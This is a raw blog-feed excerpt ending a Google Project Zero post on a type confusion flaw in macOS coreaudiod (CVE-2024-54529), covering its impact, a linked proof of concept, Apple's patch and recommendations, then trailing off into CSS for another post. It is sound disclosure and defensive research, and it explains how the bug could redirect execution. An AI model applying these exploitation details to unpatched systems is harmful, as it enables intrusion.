 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidP9ltocHJ3_5s3oK7FHXnAglfW87buCt3UwuPBfkw5XB3q-EQsC36LpebYc9N-tJcxUbJ72mzRut3uqqlLUsnfOrO1GbT2_HnwNfA-voCTKgofQFnsaZUcUDTfye51DIESVMc2JeamxkGMwpSPnGNiJQDdLHVoAHz04Q70GT8FYF9MgKgTR-mV26_gvs/s1046/image18.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidP9ltocHJ3_5s3oK7FHXnAglfW87buCt3UwuPBfkw5XB3q-EQsC36LpebYc9N-tJcxUbJ72mzRut3uqqlLUsnfOrO1GbT2_HnwNfA-voCTKgofQFnsaZUcUDTfye51DIESVMc2JeamxkGMwpSPnGNiJQDdLHVoAHz04Q70GT8FYF9MgKgTR-mV26_gvs/s1046/image18.png&quot; border=&quot;0&quot; alt=&quot;A snippet of disassembled code. Key instructions include calls to HALC_ProxyObjectMap_CopyObjectByID, HALB_Info::IsStandardClass, and HALC_ProxyObjectMap::RetainObject. An &amp;#39;ioct&amp;#39; string is being compared with a memory location.&quot; style=&quot;max-height: 750px; max-width: 500px;&quot;title=&quot;A snippet of disassembled code. Key instructions include calls to HALC_ProxyObjectMap_CopyObjectByID, HALB_Info::IsStandardClass, and HALC_ProxyObjectMap::RetainObject. An &amp;#39;ioct&amp;#39; string is being compared with a memory location.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The impact of this vulnerability can range from an information leak to control flow hijacking. In this case, since the vulnerable code is performing a function call, an attacker could potentially control the data at the offset read during the type &lt;/span&gt;&lt;span&gt;confusion&lt;/span&gt;&lt;span&gt;, allowing them to control the function pointer and redirect execution. Alternatively, if the attacker can provide an object smaller than &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;0x68&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes, an out-of-bounds read &lt;/span&gt;&lt;span&gt;would&lt;/span&gt;&lt;span&gt;&amp;nbsp;be possible, paving the way for further exploitation opportunities such as memory corruption or arbitrary code &lt;/span&gt;&lt;span&gt;execution&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.e0031rz8xav3&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;Creating a Proof of Concept&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Because my fuzzing harness was connected downstream in the Mach message handling process, it was important to build an end-to-end proof-of-concept that used the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;mach_msg&lt;/span&gt;&lt;span&gt;&amp;nbsp;API to send a Mach message &lt;/span&gt;&lt;span&gt;to the vulnerable message handler&lt;/span&gt;&lt;span&gt;&amp;nbsp;within &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span&gt;. Otherwise, we might have triggered a false positive as we did in the case of the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;mig_deallocate&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;crash where we thought we had a bug, but were actually just bypassing security checks.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;In this case, however, the bug was triggerable using the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;mach_msg&lt;/span&gt;&lt;span&gt;&amp;nbsp;API, making it a legitimate opportunity for use as a sandbox escape. The proof-of-concept code I put together for triggering this issue on MacOS Sequoia 15.0.1 can be found &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/blob/master/CoreAudioFuzz/cve-2024-54529-poc-macos-sequoia-15.0.1.c&quot;&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;It&amp;rsquo;s worth noting that code running on Apple Silicon uses &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#sec0167b469d&quot;&gt;Pointer Authentication Codes (PACs)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&lt;a href=&quot;https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#sec0167b469d&quot;&gt;&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;, which could make exploitation more difficult. In order to exploit this bug through an invalid vtable call, an attacker would need the ability to sign pointers, &lt;/span&gt;&lt;span&gt;which would be possible if the attacker gained native code execution in an Apple-signed process&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;. However, I only analyzed and tested this issue on x86-64 versions of MacOS.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.uvyhsu8hlaqy&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;How Apple Fixed the Issue&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;I reported this type confusion vulnerability to Apple on October 9, 2024. It was fixed on December 11, 2024, assigned &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2024-54529&quot;&gt;CVE-2024-54529&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and a patch was introduced in MacOS &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://support.apple.com/en-us/121839&quot;&gt;Sequoia 15.2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://support.apple.com/en-us/121840&quot;&gt;Sonoma 14.7.2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://support.apple.com/en-us/121842&quot;&gt;Ventura 13.7.2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Interestingly, Apple mentions that the vulnerability allowed for code execution with kernel privileges. That part interested me, since as far as I could tell the execution was only possible as the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_coreaudiod&lt;/span&gt;&lt;span&gt;&amp;nbsp;group, which was not equivalent to kernel &lt;/span&gt;&lt;span&gt;privileges&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgdEC2Zg8KAf9P8QrXuAJYuJYSR21IwMA0UbZXYNfMFvRaekDLjoyOOkYSRWDUlykrPePTiao4fCcJoQnvdBjjd-yZDv0D0tnjlIvpvkELHtkdeByETrS94ekMNjsAuNgORo28p5cNn_PuZ3ZL9i_3MjSyX82loXblIHS79zwNa62fa3VHFr7K9GjT-c2s/s1186/image12.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgdEC2Zg8KAf9P8QrXuAJYuJYSR21IwMA0UbZXYNfMFvRaekDLjoyOOkYSRWDUlykrPePTiao4fCcJoQnvdBjjd-yZDv0D0tnjlIvpvkELHtkdeByETrS94ekMNjsAuNgORo28p5cNn_PuZ3ZL9i_3MjSyX82loXblIHS79zwNa62fa3VHFr7K9GjT-c2s/s1186/image12.png&quot; border=&quot;0&quot; alt=&quot;A screenshot of a security advisory for an Audio vulnerability in macOS Sonoma. The impact states An app may be able to execute arbitrary code with kernel privileges. The description notes A logic issue was addressed with improved checks&amp;quot; and credits CVE-2024-54529 to Dillon Franke working with Google Project Zero.&quot; style=&quot;max-height: 750px; max-width: 500px;&quot;title=&quot;A screenshot of a security advisory for an Audio vulnerability in macOS Sonoma. The impact states An app may be able to execute arbitrary code with kernel privileges. The description notes A logic issue was addressed with improved checks&amp;quot; and credits CVE-2024-54529 to Dillon Franke working with Google Project Zero.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Apple&amp;rsquo;s fix was simple: since each HALS Object contains information about its type, the patch adds a check within the affected functions to ensure the fetched object is of type &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;ioct&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;before dereferencing the object and performing a function call.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2CtOp2p3JDfot90Eo-qt3IM_P5kFGbV2s8wug_jJ9vUs29mz9CkNU6VQuC2eJq8JWqcVe5vK0jqmNV3KRtmuLRcelf0ImYKGH7Edu6-HLKiRXamVPMjA3rewH5_myFw1DjLdclEcq4pNQueY_iB6lW2pMLuQD5FKKNpf9fT2w3eAsQ4nIri1csyiZysw/s1999/image1.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2CtOp2p3JDfot90Eo-qt3IM_P5kFGbV2s8wug_jJ9vUs29mz9CkNU6VQuC2eJq8JWqcVe5vK0jqmNV3KRtmuLRcelf0ImYKGH7Edu6-HLKiRXamVPMjA3rewH5_myFw1DjLdclEcq4pNQueY_iB6lW2pMLuQD5FKKNpf9fT2w3eAsQ4nIri1csyiZysw/s1200/image1.png&quot; border=&quot;0&quot; alt=&quot;A snippet of disassembled code with annotations. Several cmp compare instructions are highlighted with Type Check pointing to comparisons with the string ioct. Further down, a call qword ptr rax+158h instruction is highlighted with Object dereference/function call, indicating a potential point of interest for a vulnerability if the object or function pointer can be controlled.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A snippet of disassembled code with annotations. Several cmp compare instructions are highlighted with Type Check pointing to comparisons with the string ioct. Further down, a call qword ptr rax+158h instruction is highlighted with Object dereference/function call, indicating a potential point of interest for a vulnerability if the object or function pointer can be controlled.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;You might have noticed how the offset derefenced within the HALS Object is &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;0x70&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the updated version, but was &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;0x68&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the vulnerable version. Often, such struct modifications are not security relevant, but will differ based on other bug fixes or added features.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=&quot;VEfNEQsFFH-c23&quot; id=&quot;h.bmqhhd9f9add&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c21 VEfNEQsFFH-c15&quot;&gt;Recommendations&lt;/span&gt;&lt;/h1&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;To prevent similar type confusion vulnerabilities in the future, Apple should consider modifying the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CopyObjectByObjectID&lt;/span&gt;&lt;span&gt;&amp;nbsp;function (or any others that make assumptions about an object&amp;rsquo;s type) to include a type check. This could be achieved by passing the expected object type as an argument and verifying the type of the fetched object before returning it. This approach is similar to how &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://www.newtonsoft.com/json/help/html/M_Newtonsoft_Json_JsonConvert_DeserializeObject__1.htm&quot;&gt;deserialization functions&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;often include a template parameter to ensure type safety.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=&quot;VEfNEQsFFH-c23&quot; id=&quot;h.azn68inxtj7k&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c21 VEfNEQsFFH-c15&quot;&gt;Conclusion&lt;/span&gt;&lt;/h1&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;This blog post described my journey into the world of MacOS vulnerability research and fuzzing. I hope I have shown how a knowledge-driven fuzzing approach can allow rapid prototyping and iteration, a deep understanding of the target, and high impact &lt;/span&gt;&lt;span&gt;bugs&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;In my next post, I will perform a detailed walkthrough of my experience attempting to exploit CVE-2024-54529.&lt;/span&gt;&lt;/p&gt;




</content><link rel='replies' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/2451342535286924765/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='https://googleprojectzero.blogspot.com/2025/05/breaking-sound-barrier-part-i-fuzzing.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/2451342535286924765'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/2451342535286924765'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/2025/05/breaking-sound-barrier-part-i-fuzzing.html' title='Breaking the Sound Barrier Part I: Fuzzing CoreAudio with Mach Messages'/><author><name>Google Project Zero</name><uri>http://www.blogger.com/profile/08975904405228580347</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_h5AXJEFTBHQa0PFGnpwzqggpFbxNHIXMlCga7afZdi-qtzdBRGEy1v5c7a_b48JI3mY7LNicZihUBDB6cUHPnLhnLW1ReCSJVQq9sksmL1Y3CSHEGwTT28i8vgwgrvJPeLo2bf0RxEpLx4uO3OjMDVuqlIbvIO-GORZ5KsVC8MBF-94lUSThyphenhyphen_euKIo/s72-c/unnamed.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-4838136820032157985.post-8554525684674118908</id><published>2025-04-16T14:19:00.000-07:00</published><updated>2025-04-16T14:34:14.680-07:00</updated><title type='text'>The Windows Registry Adventure #6: Kernel-mode objects</title><content type='html'>&lt;style type=&quot;text/css&quot;&gt;@import url(https://themes.googleusercontent.com/fonts/css?kit=4mNYFHt_IKFsPe52toizHz0e5qzIIUg9OvSRGeMDk3I);.lst-kix_404916xkl9yq-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_617gqi1nmysw-0{list-style-type:none}.lst-kix_4j4spo1gm828-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_twe3knjlgokg-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_twe3knjlgokg-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_404916xkl9yq-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_404916xkl9yq-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_twe3knjlgokg-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_twe3knjlgokg-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_404916xkl9yq-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_404916xkl9yq-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_4j4spo1gm828-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_twe3knjlgokg-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_404916xkl9yq-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_4j4spo1gm828-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ab8mfzoog88u-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_404916xkl9yq-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_yglvxt1mgfm7-0&gt;li{counter-increment:lst-ctn-kix_yglvxt1mgfm7-0}.lst-kix_twe3knjlgokg-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_twe3knjlgokg-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_4ibbyvy1vtvo-5{list-style-type:none}ol.lst-kix_fr1tg9t3fnuc-8.start{counter-reset:lst-ctn-kix_fr1tg9t3fnuc-8 0}.lst-kix_ab8mfzoog88u-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_617gqi1nmysw-7{list-style-type:none}.lst-kix_4j4spo1gm828-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_617gqi1nmysw-8{list-style-type:none}.lst-kix_d2x9ez3q88fg-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_617gqi1nmysw-5{list-style-type:none}.lst-kix_4j4spo1gm828-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_617gqi1nmysw-6{list-style-type:none}.lst-kix_twe3knjlgokg-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_404916xkl9yq-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_617gqi1nmysw-3{list-style-type:none}.lst-kix_4j4spo1gm828-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_617gqi1nmysw-4{list-style-type:none}.lst-kix_404916xkl9yq-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_617gqi1nmysw-1{list-style-type:none}ul.lst-kix_617gqi1nmysw-2{list-style-type:none}.lst-kix_twe3knjlgokg-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_xrub3d64di6y-7&gt;li{counter-increment:lst-ctn-kix_xrub3d64di6y-7}ol.lst-kix_iwbl6bi5grxz-0{list-style-type:none}.lst-kix_ab8mfzoog88u-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_q60yv0wr6jjb-2&gt;li{counter-increment:lst-ctn-kix_q60yv0wr6jjb-2}ol.lst-kix_iwbl6bi5grxz-5{list-style-type:none}ol.lst-kix_iwbl6bi5grxz-8{list-style-type:none}ol.lst-kix_iwbl6bi5grxz-6{list-style-type:none}ol.lst-kix_iwbl6bi5grxz-7{list-style-type:none}.lst-kix_4j4spo1gm828-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ab8mfzoog88u-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ab8mfzoog88u-6&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_xrub3d64di6y-2.start{counter-reset:lst-ctn-kix_xrub3d64di6y-2 0}.lst-kix_4j4spo1gm828-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_4j4spo1gm828-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ab8mfzoog88u-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ab8mfzoog88u-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ab8mfzoog88u-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ab8mfzoog88u-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_h7x1tub5dbe4-8{list-style-type:none}.lst-kix_3ebgtidubwl1-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_7xs8c2w8mgl2-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_qaar1kuwufoe-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_3ebgtidubwl1-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_4j4spo1gm828-3{list-style-type:none}.lst-kix_7xs8c2w8mgl2-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_qaar1kuwufoe-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_4j4spo1gm828-2{list-style-type:none}ul.lst-kix_4j4spo1gm828-5{list-style-type:none}ul.lst-kix_4j4spo1gm828-4{list-style-type:none}.lst-kix_qaar1kuwufoe-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_4j4spo1gm828-1{list-style-type:none}.lst-kix_7xs8c2w8mgl2-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_sjd249b6zrqw-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_qaar1kuwufoe-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_4j4spo1gm828-0{list-style-type:none}.lst-kix_3ebgtidubwl1-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_404916xkl9yq-0{list-style-type:none}.lst-kix_qaar1kuwufoe-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_404916xkl9yq-2{list-style-type:none}ul.lst-kix_404916xkl9yq-1{list-style-type:none}.lst-kix_3ebgtidubwl1-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_sjd249b6zrqw-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_sjd249b6zrqw-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_qaar1kuwufoe-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_qaar1kuwufoe-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_3ebgtidubwl1-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_sjd249b6zrqw-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_h7x1tub5dbe4-0{list-style-type:none}ul.lst-kix_h7x1tub5dbe4-1{list-style-type:none}ul.lst-kix_h7x1tub5dbe4-2{list-style-type:none}.lst-kix_3ebgtidubwl1-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_3ebgtidubwl1-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_h7x1tub5dbe4-3{list-style-type:none}.lst-kix_qaar1kuwufoe-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_h7x1tub5dbe4-4{list-style-type:none}ul.lst-kix_h7x1tub5dbe4-5{list-style-type:none}.lst-kix_xrub3d64di6y-0&gt;li{counter-increment:lst-ctn-kix_xrub3d64di6y-0}.lst-kix_sjd249b6zrqw-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_qaar1kuwufoe-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_h7x1tub5dbe4-6{list-style-type:none}.lst-kix_3ebgtidubwl1-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_fr1tg9t3fnuc-3.start{counter-reset:lst-ctn-kix_fr1tg9t3fnuc-3 0}ul.lst-kix_h7x1tub5dbe4-7{list-style-type:none}ul.lst-kix_404916xkl9yq-8{list-style-type:none}ol.lst-kix_fr1tg9t3fnuc-2{list-style-type:none}ul.lst-kix_404916xkl9yq-7{list-style-type:none}ol.lst-kix_xrub3d64di6y-7.start{counter-reset:lst-ctn-kix_xrub3d64di6y-7 0}ol.lst-kix_fr1tg9t3fnuc-1{list-style-type:none}ol.lst-kix_fr1tg9t3fnuc-4{list-style-type:none}ol.lst-kix_fr1tg9t3fnuc-3{list-style-type:none}ul.lst-kix_404916xkl9yq-4{list-style-type:none}ol.lst-kix_fr1tg9t3fnuc-6{list-style-type:none}ul.lst-kix_404916xkl9yq-3{list-style-type:none}ol.lst-kix_fr1tg9t3fnuc-5{list-style-type:none}ul.lst-kix_404916xkl9yq-6{list-style-type:none}ol.lst-kix_fr1tg9t3fnuc-8{list-style-type:none}ul.lst-kix_404916xkl9yq-5{list-style-type:none}ol.lst-kix_fr1tg9t3fnuc-7{list-style-type:none}.lst-kix_7xs8c2w8mgl2-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_sjd249b6zrqw-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_4j4spo1gm828-7{list-style-type:none}.lst-kix_7xs8c2w8mgl2-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_7xs8c2w8mgl2-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_sjd249b6zrqw-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_4j4spo1gm828-6{list-style-type:none}.lst-kix_7xs8c2w8mgl2-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_7xs8c2w8mgl2-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_sjd249b6zrqw-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_4j4spo1gm828-8{list-style-type:none}ol.lst-kix_exm17v4ppgu6-7.start{counter-reset:lst-ctn-kix_exm17v4ppgu6-7 0}.lst-kix_yglvxt1mgfm7-7&gt;li{counter-increment:lst-ctn-kix_yglvxt1mgfm7-7}.lst-kix_7xs8c2w8mgl2-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_sjd249b6zrqw-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_d8jkcmfkq4n7-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_fr1tg9t3fnuc-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fr1tg9t3fnuc-2,lower-roman) &quot;. &quot;}.lst-kix_q2cw7ye43y3y-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_q2cw7ye43y3y-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_d8jkcmfkq4n7-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_d8jkcmfkq4n7-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s0pfb3xl5agk-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_fr1tg9t3fnuc-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_fr1tg9t3fnuc-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fr1tg9t3fnuc-4,lower-latin) &quot;. &quot;}.lst-kix_q2cw7ye43y3y-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_fr1tg9t3fnuc-4&gt;li{counter-increment:lst-ctn-kix_fr1tg9t3fnuc-4}.lst-kix_iwbl6bi5grxz-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_iwbl6bi5grxz-8,lower-roman) &quot;. &quot;}.lst-kix_s0pfb3xl5agk-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_fr1tg9t3fnuc-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fr1tg9t3fnuc-8,lower-roman) &quot;. &quot;}ol.lst-kix_q60yv0wr6jjb-7.start{counter-reset:lst-ctn-kix_q60yv0wr6jjb-7 0}.lst-kix_kf4qbiideq6a-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_fr1tg9t3fnuc-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fr1tg9t3fnuc-6,decimal) &quot;. &quot;}.lst-kix_q2cw7ye43y3y-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_kf4qbiideq6a-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_iwbl6bi5grxz-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_iwbl6bi5grxz-0,decimal) &quot;. &quot;}.lst-kix_iwbl6bi5grxz-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_kf4qbiideq6a-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_kf4qbiideq6a-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ujr7qqe1p9gc-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_psxevvsc6jj-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_h3wwlbtif53z-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_iwbl6bi5grxz-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_iwbl6bi5grxz-6,decimal) &quot;. &quot;}.lst-kix_kf4qbiideq6a-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_3ebgtidubwl1-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ujr7qqe1p9gc-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_h3wwlbtif53z-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_d2sey3cqswhj-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_d8jkcmfkq4n7-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_d8jkcmfkq4n7-2&gt;li:before{content:&quot;\0025a0   